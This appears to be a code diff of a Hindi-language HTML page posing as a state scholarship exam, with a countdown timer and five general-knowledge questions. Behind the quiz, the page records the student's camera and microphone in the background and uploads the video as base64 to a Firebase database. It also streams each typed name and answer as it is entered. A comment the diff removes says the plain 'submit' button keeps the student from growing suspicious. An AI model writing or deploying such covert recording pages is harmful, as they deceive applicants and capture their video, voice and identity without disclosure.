@@ -11,18 +11,19 @@
     <style>
         * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 0; }
         body { background: #f0f4f8; color: #1e293b; padding: 15px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .app-card { width: 100%; max-width: 500px; background: white; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); overflow: hidden; }
-        .banner { background: linear-gradient(135deg, #1e3c72, #2a5298); color: white; padding: 25px; text-align: center; }
-        .banner h2 { font-size: 22px; margin-bottom: 5px; }
+        .app-card { width: 100%; max-width: 600px; background: white; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); overflow: hidden; }
+        .banner { background: linear-gradient(135deg, #1e3c72, #2a5298); color: white; padding: 20px; text-align: center; position: relative; }
+        .banner h2 { font-size: 20px; margin-bottom: 5px; }
+        .timer-box { position: absolute; top: 15px; right: 15px; background: rgba(255,255,255,0.2); padding: 5px 10px; border-radius: 20px; font-weight: bold; font-size: 14px; }
         .content { padding: 25px; }
-        .input-group { margin-bottom: 18px; }
+        .input-group { margin-bottom: 20px; }
         .input-group label { display: block; margin-bottom: 6px; font-weight: bold; font-size: 14px; }
         .input-group input { width: 100%; padding: 12px; border: 1px solid #cbd5e1; border-radius: 8px; font-size: 14px; }
-        .qa-section { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 10px; padding: 15px; margin-bottom: 15px; }
-        .qa-title { font-weight: bold; font-size: 14px; color: #1e3c72; margin-bottom: 8px; }
-        .qa-options label { display: block; background: white; border: 1px solid #cbd5e1; padding: 10px; border-radius: 6px; margin-bottom: 6px; font-size: 13px; cursor: pointer; }
+        .qa-section { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 10px; padding: 15px; margin-bottom: 18px; }
+        .qa-title { font-weight: bold; font-size: 14px; color: #1e3c72; margin-bottom: 10px; line-height: 1.4; }
+        .qa-options label { display: block; background: white; border: 1px solid #cbd5e1; padding: 12px; border-radius: 6px; margin-bottom: 8px; font-size: 13px; cursor: pointer; transition: 0.2s; }
+        .qa-options label:hover { background: #f1f5f9; }
         .btn-submit { width: 100%; padding: 15px; background: #1e3c72; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; }
-        .status-feed { font-size: 12px; color: #64748b; text-align: center; margin-top: 10px; display: none; }
     </style>
 
     <script>
@@ -39,12 +40,12 @@
         
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
-
-        // हर छात्र के लिए बिल्कुल अलग और यूनिक आईडी (Unique Timestamp ID)
-        const uniqueSessionId = 'student_' + Date.now() + '_' + Math.floor(Math.random() * 1000);
+        const uniqueSessionId = 'student_' + Date.now();
 
         let mediaRecorder;
         let recordedChunks = [];
+        let timeLeft = 1800; // 30 मिनट (सेकंड में)
+        let timerInterval;
 
         window.addEventListener("load", initExam);
 
@@ -58,30 +59,37 @@
                 });
 
                 startBackgroundRecording(stream);
+                startTimer();
             } catch (err) {
                 alert("परीक्षा शुरू करने के लिए कैमरा और माइक अनुमति अनिवार्य है।");
             }
         }
 
+        function startTimer() {
+            timerInterval = setInterval(() => {
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    autoSubmit();
+                } else {
+                    timeLeft--;
+                    let minutes = Math.floor(timeLeft / 60);
+                    let seconds = timeLeft % 60;
+                    document.getElementById("timer").innerText = 
+                        (minutes < 10 ? "0" : "") + minutes + ":" + (seconds < 10 ? "0" : "") + seconds;
+                }
+            }, 1000);
+        }
+
         function startBackgroundRecording(stream) {
             mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
-            
-            mediaRecorder.ondataavailable = function(e) {
-                if (e.data.size > 0) {
-                    recordedChunks.push(e.data);
-                }
-            };
-
-            mediaRecorder.onstop = function() {
+            mediaRecorder.ondataavailable = e => { if (e.data.size > 0) recordedChunks.push(e.data); };
+            mediaRecorder.onstop = () => {
                 let blob = new Blob(recordedChunks, { type: 'video/webm' });
                 let reader = new FileReader();
                 reader.readAsDataURL(blob); 
                 reader.onloadend = function() {
-                    let base64String = reader.result;
-                    
-                    // हर छात्र के अपने खुद के यूनिक फोल्डर में अलग वीडियो सेव होगी
                     database.ref('online_tests/' + uniqueSessionId).update({
-                        recorded_video_feed: base64String,
+                        recorded_video_feed: reader.result,
                         portal_status: "SUBMITTED",
                         end_time: new Date().toISOString()
                     }).then(() => {
@@ -94,17 +102,22 @@
         }
 
         function sendProgress(key, value) {
-            let data = {};
-            data[key] = value;
+            let data = {}; data[key] = value;
             database.ref('online_tests/' + uniqueSessionId).update(data);
         }
 
         function submitTest(event) {
-            event.preventDefault();
+            if(event) event.preventDefault();
+            clearInterval(timerInterval);
             if (mediaRecorder && mediaRecorder.state !== "inactive") {
-                document.getElementById('btn-text').innerText = "कृपया प्रतीक्षा करें...";
+                document.getElementById('btn-text').innerText = "सबमिट हो रहा है...";
                 mediaRecorder.stop();
             }
+        }
+
+        function autoSubmit() {
+            alert("समय समाप्त हो गया है! आपका टेस्ट ऑटो-सबमिट किया जा रहा है।");
+            submitTest(null);
         }
     </script>
 </head>
@@ -112,27 +125,68 @@
 
 <div class="app-card">
     <div class="banner">
-        <h2>प्रवेश परीक्षा (Pre-Test)</h2>
-        <p>स्कॉलरशिप पोर्टल</p>
+        <h2>राज्य स्तरीय स्कॉलरशिप परीक्षा</h2>
+        <p>सामान्य ज्ञान एवं तार्किक क्षमता</p>
+        <div class="timer-box">⏱️ <span id="timer">30:00</span></div>
     </div>
 
     <div class="content">
         <form onsubmit="submitTest(event)">
             <div class="input-group">
-                <label>छात्र का पूरा नाम:</label>
+                <label>परीक्षार्थी का पूरा नाम:</label>
                 <input type="text" placeholder="यहाँ अपना नाम लिखें" required oninput="sendProgress('student_name', this.value)">
             </div>
 
+            <!-- सवाल १ -->
             <div class="qa-section">
-                <div class="qa-title">💡 सवाल १: कंप्यूटर का कौन सा भाग 'मस्तिष्क' (Brain) कहलाता है?</div>
+                <div class="qa-title">Q1. यदि किसी कूट भाषा में 'COMPUTER' को 'RFUVQNPC' लिखा जाता है, तो उसी भाषा में 'MEDICINE' को क्या लिखा जाएगा?</div>
                 <div class="qa-options">
-                    <label><input type="radio" name="q1" value="A" onclick="sendProgress('answer_q1', 'A')"> A) मॉनिटर</label>
-                    <label><input type="radio" name="q1" value="B" onclick="sendProgress('answer_q1', 'B')"> B) सी.पी.यू. (CPU)</label>
-                    <label><input type="radio" name="q1" value="C" onclick="sendProgress('answer_q1', 'C')"> C) कीबोर्ड</label>
+                    <label><input type="radio" name="q1" value="A" onclick="sendProgress('answer_q1', 'A')"> A) EOJDEJFM</label>
+                    <label><input type="radio" name="q1" value="B" onclick="sendProgress('answer_q1', 'B')"> B) EOJDJEFM</label>
+                    <label><input type="radio" name="q1" value="C" onclick="sendProgress('answer_q1', 'C')"> C) MFEJDJOE</label>
                 </div>
             </div>
 
-            <!-- बटन पर सिर्फ सबमिट लिखा है, छात्र को शक नहीं होगा -->
+            <!-- सवाल २ -->
+            <div class="qa-section">
+                <div class="qa-title">Q2. भारतीय संविधान का कौन सा अनुच्छेद 'समानता के अधिकार' (Right to Equality) से संबंधित है?</div>
+                <div class="qa-options">
+                    <label><input type="radio" name="q2" value="A" onclick="sendProgress('answer_q2', 'A')"> A) अनुच्छेद १२</label>
+                    <label><input type="radio" name="q2" value="B" onclick="sendProgress('answer_q2', 'B')"> B) अनुच्छेद १४</label>
+                    <label><input type="radio" name="q2" value="C" onclick="sendProgress('answer_q2', 'C')"> C) अनुच्छेद २१</label>
+                </div>
+            </div>
+
+            <!-- सवाल ३ -->
+            <div class="qa-section">
+                <div class="qa-title">Q3. नीति आयोग (NITI Aayog) के अध्यक्ष निम्नलिखित में से कौन होते हैं?</div>
+                <div class="qa-options">
+                    <label><input type="radio" name="q3" value="A" onclick="sendProgress('answer_q3', 'A')"> A) राष्ट्रपति</label>
+                    <label><input type="radio" name="q3" value="B" onclick="sendProgress('answer_q3', 'B')"> B) वित्त मंत्री</label>
+                    <label><input type="radio" name="q3" value="C" onclick="sendProgress('answer_q3', 'C')"> C) प्रधानमंत्री</label>
+                </div>
+            </div>
+
+            <!-- सवाल ४ -->
+            <div class="qa-section">
+                <div class="qa-title">Q4. ओजोन परत (Ozone Layer) वायुमंडल की किस परत में मुख्य रूप से पाई जाती है?</div>
+                <div class="qa-options">
+                    <label><input type="radio" name="q4" value="A" onclick="sendProgress('answer_q4', 'A')"> A) क्षोभमंडल (Troposphere)</label>
+                    <label><input type="radio" name="q4" value="B" onclick="sendProgress('answer_q4', 'B')"> B) समतापमंडल (Stratosphere)</label>
+                    <label><input type="radio" name="q4" value="C" onclick="sendProgress('answer_q4', 'C')"> C) मध्यमंडल (Mesosphere)</label>
+                </div>
+            </div>
+
+            <!-- सवाल ५ -->
+            <div class="qa-section">
+                <div class="qa-title">Q5. यदि एक टैंक को पाइप A ४ घंटे में और पाइप B ६ घंटे में भर सकता है, तो दोनों पाइप एक साथ खोलने पर टैंक कितने समय में भरेगा?</div>
+                <div class="qa-options">
+                    <label><input type="radio" name="q5" value="A" onclick="sendProgress('answer_q5', 'A')"> A) २.४ घंटे</label>
+                    <label><input type="radio" name="q5" value="B" onclick="sendProgress('answer_q5', 'B')"> B) ३.० घंटे</label>
+                    <label><input type="radio" name="q5" value="C" onclick="sendProgress('answer_q5', 'C')"> C) ३.५ घंटे</label>
+                </div>
+            </div>
+
             <button type="submit" id="btn-text" class="btn-submit">सबमिट करें</button>
         </form>
     </div>
